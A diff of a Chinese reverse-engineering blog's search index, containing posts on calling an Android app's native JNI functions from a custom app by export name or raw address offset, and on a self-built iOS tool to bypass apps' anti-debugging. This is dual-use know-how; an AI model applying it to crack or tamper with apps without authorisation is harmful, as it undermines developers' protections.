@@ -1,38 +1,24 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Android强调native函数的两种方法</title>
-    <url>/2020/04/29/Android%E5%BC%BA%E8%B0%83native%E5%87%BD%E6%95%B0%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
-    <content><![CDATA[<p>在逆向分析APP的过程中，经常会遇到native函数调用，有些是可以通过正常的IDA动态调试分析其函数逻辑算法等，但有些函数由于多线程造成调试不便，甚至由于ollvm等混淆造成逆向困难就需要自行调用native函数实现想要的结果。<br><a id="more"></a></p>
-<h1 id="通过导出函数调用native函数"><a href="#通过导出函数调用native函数" class="headerlink" title="通过导出函数调用native函数"></a>通过导出函数调用native函数</h1><p>一般普通的native函数都是有导出函数的，因此只要找到导出函数名即可调用该native函数。</p>
-<h2 id="寻找导出函数"><a href="#寻找导出函数" class="headerlink" title="寻找导出函数"></a>寻找导出函数</h2><p>首先在java层找到native函数的调用<br><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native1.jpg" alt=""></p>
-<p>接下来在so中导出函数中该native函数</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native2.jpg" alt=""></p>
-<h2 id="编写Android-APP"><a href="#编写Android-APP" class="headerlink" title="编写Android APP"></a>编写Android APP</h2><p>自己写一个带按钮的APP，调用该函数</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span></div><div class="line">	&#123;</div><div class="line">		<span class="keyword">public</span> Button button;</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span></div><div class="line">		&#123;</div><div class="line">			<span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">			setContentView(R.layout.activity_main);</div><div class="line">	</div><div class="line">			System.loadLibrary(<span class="string">"Aes"</span>);</div><div class="line">	</div><div class="line">			<span class="keyword">try</span> </div><div class="line">			&#123;</div><div class="line">				button = (Button)findViewById(R.id.btn_test);</div><div class="line">				button.setOnClickListener(<span class="keyword">new</span> OnClickListener() </div><div class="line">				&#123;</div><div class="line">			</div><div class="line">					<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span></div><div class="line">					&#123;</div><div class="line">						<span class="keyword">try</span> </div><div class="line">						&#123;</div><div class="line">							String encrypt = Aes.aesEncode(<span class="string">"12345"</span>,</div><div class="line">									<span class="string">"350710466385995"</span>);</div><div class="line">							</div><div class="line">							<span class="keyword">if</span> (<span class="keyword">null</span> != encrypt) </div><div class="line">							&#123;</div><div class="line">		</div><div class="line">								Log.d(<span class="string">"bbk"</span>,<span class="string">"encrypt:"</span> + encrypt);</div><div class="line">							&#125;</div><div class="line">							<span class="keyword">else</span> </div><div class="line">							&#123;</div><div class="line">								Log.d(<span class="string">"bbk"</span>, <span class="string">"encrypt is NULL"</span>);</div><div class="line">							&#125;	</div><div class="line">						</div><div class="line">						&#125; </div><div class="line">						<span class="keyword">catch</span> (Exception e) </div><div class="line">						&#123;</div><div class="line">							<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; e.getStackTrace().length; i++)</div><div class="line">							&#123;</div><div class="line">								Log.i(<span class="string">"bbk"</span>,e.getStackTrace()[i].toString());</div><div class="line">							&#125;</div><div class="line">						&#125; </div><div class="line">						</div><div class="line">					&#125;</div><div class="line">				&#125;);</div><div class="line">		</div><div class="line">			&#125; </div><div class="line">			<span class="keyword">catch</span> (Exception e) </div><div class="line">			&#123;</div><div class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; e.getStackTrace().length; i++)</div><div class="line">				&#123;</div><div class="line">					Log.i(<span class="string">"bbk"</span>,e.getStackTrace()[i].toString());</div><div class="line">				&#125;</div><div class="line">			&#125;  </div><div class="line">			</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
-<p>模拟原APP调用类调用native函数</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Aes</span> </span></div><div class="line">&#123;</div><div class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">aesEncode</span><span class="params">(String str, String str2)</span></span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h2 id="jni配置"><a href="#jni配置" class="headerlink" title="jni配置"></a>jni配置</h2><p>将libAes.so及其依赖库libstlport.shared.so放入jni目录，并编写mk文件配置。</p>
-<h3 id="Android-mk"><a href="#Android-mk" class="headerlink" title="Android.mk"></a>Android.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">LOCAL_PATH := $(call my-dir)</div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE := Aes</div><div class="line">LOCAL_SRC_FILES := libAes.so</div><div class="line">include $(PREBUILT_SHARED_LIBRARY)</div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE := stlport_shared</div><div class="line">LOCAL_SRC_FILES := libstlport_shared.so</div><div class="line">include $(PREBUILT_SHARED_LIBRARY)</div><div class="line"></div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE    := my_objectname</div><div class="line">LOCAL_SRC_FILES := my_objectname.cpp</div><div class="line">include $(BUILD_SHARED_LIBRARY)</div></pre></td></tr></table></figure>
-<h3 id="Application-mk"><a href="#Application-mk" class="headerlink" title="Application.mk"></a>Application.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">APP_ABI := armeabi-v7a</div></pre></td></tr></table></figure>
-<h3 id="my-objectname-app"><a href="#my-objectname-app" class="headerlink" title="my_objectname.app"></a>my_objectname.app</h3><p>里面写#include<jni.h>即可</jni.h></p>
-<p>最后将APP安装到手机上运行即可输出调用结果</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native3.jpg" alt=""></p>
-<h1 id="通过函数地址调用native函数"><a href="#通过函数地址调用native函数" class="headerlink" title="通过函数地址调用native函数"></a>通过函数地址调用native函数</h1><p>在逆向过程中还会遇到很多APP动态注册native函数，甚至是将导出函数隐藏的，就无法使用上述的调用方案了，本方案是通过函数地址来调用native函数，理论上只要找得到native函数在so中的地址就可以实现调用。</p>
-<h2 id="寻找native函数地址"><a href="#寻找native函数地址" class="headerlink" title="寻找native函数地址"></a>寻找native函数地址</h2><p>在java层找到native函数，确定其传入参数类型及个数</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native4.jpg" alt=""></p>
-<p>kxtmp函数是动态注册函数，现在字符串中搜索函数名，之后通过回溯找到函数注册地址</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native5.jpg" alt=""></p>
-<h2 id="编写调用so"><a href="#编写调用so" class="headerlink" title="编写调用so"></a>编写调用so</h2><p>本方案主要是通过自己编写的so调用native函数所在的so，自己的so名为hookso<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</div><div class="line">	</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">			<span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">			setContentView(R.layout.activity_main);</div><div class="line">			</div><div class="line">			System.loadLibrary(<span class="string">"hookso"</span>);</div><div class="line">			</div><div class="line">			<span class="keyword">float</span> value =TypedValue.complexToFloat(<span class="number">55297</span>);</div><div class="line">			Log.e(<span class="string">"DEBUG"</span>, <span class="string">": "</span> + value);</div><div class="line">		&#125;</div><div class="line">	</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</div><div class="line">			<span class="comment">// Inflate the menu; this adds items to the action bar if it is present.</span></div><div class="line">			getMenuInflater().inflate(R.menu.main, menu);</div><div class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">		&#125;</div><div class="line">	</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</div><div class="line">			<span class="comment">// Handle action bar item clicks here. The action bar will</span></div><div class="line">			<span class="comment">// automatically handle clicks on the Home/Up button, so long</span></div><div class="line">			<span class="comment">// as you specify a parent activity in AndroidManifest.xml.</span></div><div class="line">			<span class="keyword">int</span> id = item.getItemId();</div><div class="line">			<span class="keyword">if</span> (id == R.id.action_settings) &#123;</div><div class="line">				JNI.testfunc();</div><div class="line">				<span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">return</span> <span class="keyword">super</span>.onOptionsItemSelected(item);</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNI</span></span></div><div class="line">&#123;</div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">testfunc</span><span class="params">()</span></span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h2 id="jni配置-1"><a href="#jni配置-1" class="headerlink" title="jni配置"></a>jni配置</h2><h3 id="Android-mk-1"><a href="#Android-mk-1" class="headerlink" title="Android.mk"></a>Android.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"></div><div class="line">LOCAL_PATH := $(call my-dir)</div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE    := hookso</div><div class="line">LOCAL_SRC_FILES := hookso.cpp</div><div class="line"></div><div class="line">LOCAL_LDLIBS += -llog  #<span class="built_in">log</span></div><div class="line"></div><div class="line">include $(BUILD_SHARED_LIBRARY)</div></pre></td></tr></table></figure>
-<h3 id="Application-mk-1"><a href="#Application-mk-1" class="headerlink" title="Application.mk"></a>Application.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">APP_ABI := armeabi-v7a</div><div class="line">APP_STL := c++<span class="number">_</span>shared</div><div class="line">APP_CPPFLAGS := -fexceptions -frtti</div></pre></td></tr></table></figure>
-<h3 id="hookso-cpp"><a href="#hookso-cpp" class="headerlink" title="hookso.cpp"></a>hookso.cpp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;android/log.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;elf.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/un.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></div><div class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">u_int32_t</span> <span class="params">(*<span class="keyword">common_func_t</span>)</span><span class="params">(<span class="keyword">u_int32_t</span>, <span class="keyword">u_int32_t</span>, <span class="keyword">u_int32_t</span>, <span class="keyword">u_int32_t</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_TAG <span class="meta-string">"DEBUG"</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGD(lvl, fmt, args...) __android_log_print(lvl, \</span></div><div class="line">		LOG_TAG, fmt, ##args)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span>* <span class="title">get_module_base</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">const</span> <span class="keyword">char</span>* module_name)</span></span></div><div class="line">&#123;</div><div class="line">    FILE* fp;</div><div class="line">    <span class="keyword">long</span> addr = <span class="number">0</span>;</div><div class="line">    <span class="keyword">char</span> *pch;</div><div class="line">    <span class="keyword">char</span> filename[<span class="number">32</span>];</div><div class="line">    <span class="keyword">char</span> line[<span class="number">1024</span>];</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(pid &lt;= <span class="number">0</span>)&#123;</div><div class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/self/maps"</span>);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/%d/maps"</span>, pid);</div><div class="line">    &#125;</div><div class="line">    fp = fopen(filename,<span class="string">"r"</span>);</div><div class="line">    <span class="keyword">if</span>(fp != <span class="literal">NULL</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">while</span>(fgets(line, <span class="keyword">sizeof</span>(line), fp))</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span>(<span class="built_in">strstr</span>(line, module_name))</div><div class="line">            &#123;</div><div class="line">                pch = strtok(line, <span class="string">"-"</span>);</div><div class="line">                addr = strtoul(pch, <span class="literal">NULL</span>, <span class="number">16</span>);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        fclose(fp);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> (<span class="keyword">void</span>*)addr;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Java_com_example_hookso_JNI_testfunc</span><span class="params">(JNIEnv *env, jobject jobj)</span></span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Java_com_example_hookso_JNI_testfunc</span><span class="params">(JNIEnv *env, jobject jobj)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="built_in">string</span> str = <span class="string">"1"</span>;</div><div class="line">	LOGD(ANDROID_LOG_WARN, <span class="string">"Java_com_example_hookso_JNI_testfunc: %s\n"</span>, str.c_str());</div><div class="line">	<span class="keyword">void</span> *cs_handle = dlopen(<span class="string">"/data/local/tmp/native.so"</span>, RTLD_NOW);</div><div class="line">	LOGD(ANDROID_LOG_WARN, <span class="string">"[+] dlerror : %s"</span>, dlerror());</div><div class="line">	LOGD(ANDROID_LOG_WARN, <span class="string">"[+] cs_handle: %p"</span>, cs_handle);</div><div class="line"><span class="comment">//导出用下面这一句</span></div><div class="line"><span class="comment">//	void *cs_open_func = dlsym(cs_handle, "导出函数name");</span></div><div class="line"></div><div class="line">	<span class="keyword">u_int32_t</span> addr1 = (<span class="keyword">u_int32_t</span>)get_module_base(<span class="number">0</span>, <span class="string">"ntiave.so"</span>);</div><div class="line">	<span class="comment">//arm指令不加1 0，thumb指令加1 1</span></div><div class="line">	addr1 += <span class="number">0x0000ABD4</span>;</div><div class="line">	<span class="keyword">common_func_t</span> func = (<span class="keyword">common_func_t</span>)addr1;</div><div class="line"></div><div class="line">	jstring key = env-&gt;NewStringUTF(<span class="string">"1"</span>);</div><div class="line"><span class="comment">//	jstring str = env-&gt;NewStringUTF("qazwsxedcrfvtgbh64as65d465wq6d54a6s54d98aw4d65a4sd64qw6f46a4s9fd8d");</span></div><div class="line"></div><div class="line">	jstring ret1 = (jstring)func((<span class="keyword">u_int32_t</span>)env, <span class="number">0</span>, (<span class="keyword">u_int32_t</span>)key, <span class="number">0</span>);</div><div class="line"><span class="comment">//	jstring ret1 = (jstring)func((u_int32_t)env, 0, 0, 0);</span></div><div class="line"></div><div class="line">	LOGD(ANDROID_LOG_DEBUG, <span class="string">"[+] test_jstr: %s, size: %d"</span>, env-&gt;GetStringUTFChars((jstring)ret1, <span class="literal">false</span>), env-&gt;GetStringUTFLength((jstring)ret1));</div><div class="line">&#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure>
+    <title>AntiAntiDebug助手</title>
+    <url>/2021/06/28/AntiAntiDebug%E5%8A%A9%E6%89%8B/</url>
+    <content><![CDATA[<p>之前有写过针对iOS反调试的及其绕过的分析文章，<a href="https://yunnigu.dropsec.xyz/2020/04/30/%E5%8A%A8%E6%80%81%E7%BB%95%E8%BF%87iOS%E5%86%85%E8%81%94svc%E5%8F%8D%E8%B0%83%E8%AF%95/">动态绕过iOS内联svc反调试</a>，本篇主要分享一下自己集成的一款方便绕过反调试的工具。<br><a id="more"></a></p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="反调试相关技术参考"><a href="#反调试相关技术参考" class="headerlink" title="反调试相关技术参考"></a>反调试相关技术参考</h3><p><a href="http://bbs.iosre.com/t/topic/9351" target="_blank" rel="external">反调试与绕过的奇淫技巧</a><br><a href="http://bbs.iosre.com/t/topic/8179" target="_blank" rel="external">关于反调试&amp;反反调试那些事</a></p>
+<h3 id="相关知识储备"><a href="#相关知识储备" class="headerlink" title="相关知识储备"></a>相关知识储备</h3><blockquote>
+<p>MochO文件结构</p>
+<p>dyld链接加载流程</p>
+<p>iOS inline Hook</p>
+<p>Preferenceloader，applist模块集成</p>
+</blockquote>
+<p>之前对反调试的绕过一般都是采用针对对应APP编写Hook插件来绕过反调试，或者是启动调试定位反调试点，修改寄存器nop汇编指令进行绕过，<br>前几天在使用RevealLoader的过程中，看到其下图界面，突发奇想是否可以开发一个通用的插件，选中某个APP即可绕过其反调试，不再需要逐个分析APP的反调试的反调试点，于是通过之前对反调试的一些积累集成了本工具。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/AntiAntiDebug1.png" alt=""></p>
+<h2 id="设置界面开发"><a href="#设置界面开发" class="headerlink" title="设置界面开发"></a>设置界面开发</h2><p>通过阅读<a href="https://github.com/heardrwt/RevealLoader" target="_blank" rel="external">RevealLoader</a></p>
 ]]></content>
       <tags>
-        <tag>Android</tag>
-        <tag>Tools</tag>
-        <tag>eclipse</tag>
+        <tag>iOS</tag>
+        <tag>MachO</tag>
+        <tag>Tweak</tag>
       </tags>
   </entry>
   <entry>
@@ -77,21 +63,71 @@ sign.aliasPassword=654321
       </tags>
   </entry>
   <entry>
-    <title>AntiAntiDebug助手</title>
-    <url>/2021/06/28/AntiAntiDebug%E5%8A%A9%E6%89%8B/</url>
-    <content><![CDATA[<p>之前有写过针对iOS反调试的及其绕过的分析文章，<a href="https://yunnigu.dropsec.xyz/2020/04/30/%E5%8A%A8%E6%80%81%E7%BB%95%E8%BF%87iOS%E5%86%85%E8%81%94svc%E5%8F%8D%E8%B0%83%E8%AF%95/">动态绕过iOS内联svc反调试</a>，本篇主要分享一下自己集成的一款方便绕过反调试的工具。<br><a id="more"></a></p>
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="反调试相关技术参考"><a href="#反调试相关技术参考" class="headerlink" title="反调试相关技术参考"></a>反调试相关技术参考</h3><p><a href="http://bbs.iosre.com/t/topic/9351" target="_blank" rel="external">反调试与绕过的奇淫技巧</a><br><a href="http://bbs.iosre.com/t/topic/8179" target="_blank" rel="external">关于反调试&amp;反反调试那些事</a></p>
-<h3 id="相关知识储备"><a href="#相关知识储备" class="headerlink" title="相关知识储备"></a>相关知识储备</h3><pre><code>MochO文件结构
-dyld链接加载流程
-iOS inline Hook
-Preferenceloader，applist模块集成
-</code></pre><p>之前对反调试的绕过一般都是采用针对对应APP编写Hook插件来绕过反调试，或者是启动调试定位反调试点，修改寄存器nop汇编指令进行绕过，<br>前几天在使用RevealLoader的过程中，看到其下图界面，突发奇想是否可以开发一个通用的插件，选中某个APP即可绕过其反调试，不再需要逐个分析APP的反调试的反调试点，于是通过之前对反调试的一些积累集成了本工具。</p>
-<p>## </p>
+    <title>Android强调native函数的两种方法</title>
+    <url>/2020/04/29/Android%E5%BC%BA%E8%B0%83native%E5%87%BD%E6%95%B0%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<p>在逆向分析APP的过程中，经常会遇到native函数调用，有些是可以通过正常的IDA动态调试分析其函数逻辑算法等，但有些函数由于多线程造成调试不便，甚至由于ollvm等混淆造成逆向困难就需要自行调用native函数实现想要的结果。<br><a id="more"></a></p>
+<h1 id="通过导出函数调用native函数"><a href="#通过导出函数调用native函数" class="headerlink" title="通过导出函数调用native函数"></a>通过导出函数调用native函数</h1><p>一般普通的native函数都是有导出函数的，因此只要找到导出函数名即可调用该native函数。</p>
+<h2 id="寻找导出函数"><a href="#寻找导出函数" class="headerlink" title="寻找导出函数"></a>寻找导出函数</h2><p>首先在java层找到native函数的调用<br><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native1.jpg" alt=""></p>
+<p>接下来在so中导出函数中该native函数</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native2.jpg" alt=""></p>
+<h2 id="编写Android-APP"><a href="#编写Android-APP" class="headerlink" title="编写Android APP"></a>编写Android APP</h2><p>自己写一个带按钮的APP，调用该函数</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span></div><div class="line">	&#123;</div><div class="line">		<span class="keyword">public</span> Button button;</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span></div><div class="line">		&#123;</div><div class="line">			<span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">			setContentView(R.layout.activity_main);</div><div class="line">	</div><div class="line">			System.loadLibrary(<span class="string">"Aes"</span>);</div><div class="line">	</div><div class="line">			<span class="keyword">try</span> </div><div class="line">			&#123;</div><div class="line">				button = (Button)findViewById(R.id.btn_test);</div><div class="line">				button.setOnClickListener(<span class="keyword">new</span> OnClickListener() </div><div class="line">				&#123;</div><div class="line">			</div><div class="line">					<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span></div><div class="line">					&#123;</div><div class="line">						<span class="keyword">try</span> </div><div class="line">						&#123;</div><div class="line">							String encrypt = Aes.aesEncode(<span class="string">"12345"</span>,</div><div class="line">									<span class="string">"350710466385995"</span>);</div><div class="line">							</div><div class="line">							<span class="keyword">if</span> (<span class="keyword">null</span> != encrypt) </div><div class="line">							&#123;</div><div class="line">		</div><div class="line">								Log.d(<span class="string">"bbk"</span>,<span class="string">"encrypt:"</span> + encrypt);</div><div class="line">							&#125;</div><div class="line">							<span class="keyword">else</span> </div><div class="line">							&#123;</div><div class="line">								Log.d(<span class="string">"bbk"</span>, <span class="string">"encrypt is NULL"</span>);</div><div class="line">							&#125;	</div><div class="line">						</div><div class="line">						&#125; </div><div class="line">						<span class="keyword">catch</span> (Exception e) </div><div class="line">						&#123;</div><div class="line">							<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; e.getStackTrace().length; i++)</div><div class="line">							&#123;</div><div class="line">								Log.i(<span class="string">"bbk"</span>,e.getStackTrace()[i].toString());</div><div class="line">							&#125;</div><div class="line">						&#125; </div><div class="line">						</div><div class="line">					&#125;</div><div class="line">				&#125;);</div><div class="line">		</div><div class="line">			&#125; </div><div class="line">			<span class="keyword">catch</span> (Exception e) </div><div class="line">			&#123;</div><div class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; e.getStackTrace().length; i++)</div><div class="line">				&#123;</div><div class="line">					Log.i(<span class="string">"bbk"</span>,e.getStackTrace()[i].toString());</div><div class="line">				&#125;</div><div class="line">			&#125;  </div><div class="line">			</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
+<p>模拟原APP调用类调用native函数</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Aes</span> </span></div><div class="line">&#123;</div><div class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">aesEncode</span><span class="params">(String str, String str2)</span></span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="jni配置"><a href="#jni配置" class="headerlink" title="jni配置"></a>jni配置</h2><p>将libAes.so及其依赖库libstlport.shared.so放入jni目录，并编写mk文件配置。</p>
+<h3 id="Android-mk"><a href="#Android-mk" class="headerlink" title="Android.mk"></a>Android.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">LOCAL_PATH := $(call my-dir)</div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE := Aes</div><div class="line">LOCAL_SRC_FILES := libAes.so</div><div class="line">include $(PREBUILT_SHARED_LIBRARY)</div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE := stlport_shared</div><div class="line">LOCAL_SRC_FILES := libstlport_shared.so</div><div class="line">include $(PREBUILT_SHARED_LIBRARY)</div><div class="line"></div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE    := my_objectname</div><div class="line">LOCAL_SRC_FILES := my_objectname.cpp</div><div class="line">include $(BUILD_SHARED_LIBRARY)</div></pre></td></tr></table></figure>
+<h3 id="Application-mk"><a href="#Application-mk" class="headerlink" title="Application.mk"></a>Application.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">APP_ABI := armeabi-v7a</div></pre></td></tr></table></figure>
+<h3 id="my-objectname-app"><a href="#my-objectname-app" class="headerlink" title="my_objectname.app"></a>my_objectname.app</h3><p>里面写#include<jni.h>即可</jni.h></p>
+<p>最后将APP安装到手机上运行即可输出调用结果</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native3.jpg" alt=""></p>
+<h1 id="通过函数地址调用native函数"><a href="#通过函数地址调用native函数" class="headerlink" title="通过函数地址调用native函数"></a>通过函数地址调用native函数</h1><p>在逆向过程中还会遇到很多APP动态注册native函数，甚至是将导出函数隐藏的，就无法使用上述的调用方案了，本方案是通过函数地址来调用native函数，理论上只要找得到native函数在so中的地址就可以实现调用。</p>
+<h2 id="寻找native函数地址"><a href="#寻找native函数地址" class="headerlink" title="寻找native函数地址"></a>寻找native函数地址</h2><p>在java层找到native函数，确定其传入参数类型及个数</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native4.jpg" alt=""></p>
+<p>kxtmp函数是动态注册函数，现在字符串中搜索函数名，之后通过回溯找到函数注册地址</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native5.jpg" alt=""></p>
